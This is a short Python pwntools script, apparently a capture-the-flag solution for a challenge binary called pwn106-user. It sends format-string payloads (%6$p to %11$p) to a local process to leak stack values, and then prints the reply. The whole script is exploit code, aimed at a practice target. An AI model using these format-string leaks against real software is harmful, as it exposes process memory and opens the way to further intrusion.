# %6$p %7$p %8$p %9$p %10$p %11$p
from pwn import *

p = process("./pwn106user.pwn106-user")

p.recvuntil(b'giveaway: ')
for i in range(6,12):
	p.sendline(f'%{i}$p')

p.recvuntil(b'Thanks ')
result = p.recvline()
print(result)